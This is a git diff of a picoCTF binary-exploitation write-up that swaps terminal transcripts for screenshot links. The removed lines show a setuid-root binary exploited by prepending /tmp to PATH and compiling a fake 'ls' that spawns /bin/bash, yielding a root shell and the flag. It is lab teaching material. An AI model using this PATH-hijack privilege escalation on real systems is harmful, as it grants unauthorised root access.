@@ -21,17 +21,7 @@ It is important to get familiar with the machine we log into so that we can find
 * How it works: It takes the input for the directory as an environment variable
 * Other important takeaways: If it is listing the contents of a directory, it is most probably doing something with the ls binary
 
-```
-ctf-player@pico-chall$ ls
-bin
-ctf-player@pico-chall$ file bin
-bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l d-linux-x86-64.so.2, BuildID[shal]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripp 
-ctf-player@pico-chall$ ls -l
-ed
-total 20
--rwsr-xr-x 1 root root 18752 Aug 4 2023 bin
-ctf-player@pico-chall$
-```
+![image](https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/5815e2a0-7aa3-4358-8976-26e145f19b36)
 
 > SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file's owner.
 
@@ -53,40 +43,7 @@ First, let's log onto the machine. To logon, we will need to use ssh with the co
 
 After logging on, let’s list the environment variables, and try editing the PATH.
 
-```
-ctf-player@pico-chall$ env SHELL=/bin/bash
-PWD=/home/ctf-player
-LOGNAME=ctf-player
-MOTD_SHOWN=pam
-HOME=/home/ctf-player
-LANG=C.UTF-8
-SSH_CONNECTION=127.0.0.1 55826 127.0.0.1 22
-TERM=xterm-256color
-USER=ctf-player
-SHLVL=1
-PS1=\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ SSH_CLIENT=127.0.0.1 55826 22
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-SSH_TTY=/dev/pts/0
-_=/usr/bin/env
-ctf-player@pico-chall$ export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ga
-mes:/usr/local/games:/snap/bin
-ctf-player@pico-chall$ env
-SHELL=/bin/bash
-PWD=/home/ctf-player
-LOGNAME=ctf-player
-MOTD_SHOWN=pam
-HOME=/home/ctf-player
-LANG=C.UTF-8
-SSH_CONNECTION=127.0.0.1 55826 127.0.0.1 22
-TERM=xterm-256color
-USER=ctf-player
-SHLVL=1
-PS1=\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ SSH_CLIENT=127.0.0.1 55826 22
-PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-SSH_TTY=/dev/pts/0
-_=/usr/bin/env
-ctf-player@pico-chall$
-```
+![image](https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/64a60cc6-9cad-4ccb-bd9d-c21473fb51ae)
 
 It looks like the injection worked, so we can move on to making the fake ls executable.
 
@@ -104,19 +61,9 @@ int main()
 
 <br>
 
-```
-ctf-player@pico-chall$ touch ls.c
-ctf-player@pico-chall$ echo "#include <stdio.h>" >> ls.c
-ctf-player@pico-chall$ echo "#include <stdlib.h>" >> ls.c
-ctf-player@pico-chall$ echo "int main()" >> ls.c
-ctf-player@pico-chall$ echo "{" >> ls.c
-ctf-player@pico-chall$ echo " system(\"/bin/bash\");" >> ls.c 
-ctf-player@pico-chall$ echo "}" >> ls.c
-ctf-player@pico-chall$ cc ls.c -o ls
-ctf-player@pico-chall$ ./bin
-Listing the content of /root as root:
-root@challenge:/# cd /root
-root@challenge: /root# cat flag.txt
-picoCTF{insert_vne_flag_here}root@challenge: /root# exit
-```
+![image](https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/a7a36a0b-8473-4114-bd49-09561a07b049)
+
+then just run the bin
+
+![image](https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/984f1ed0-42e2-40c0-b297-5eb833df79e3)
 
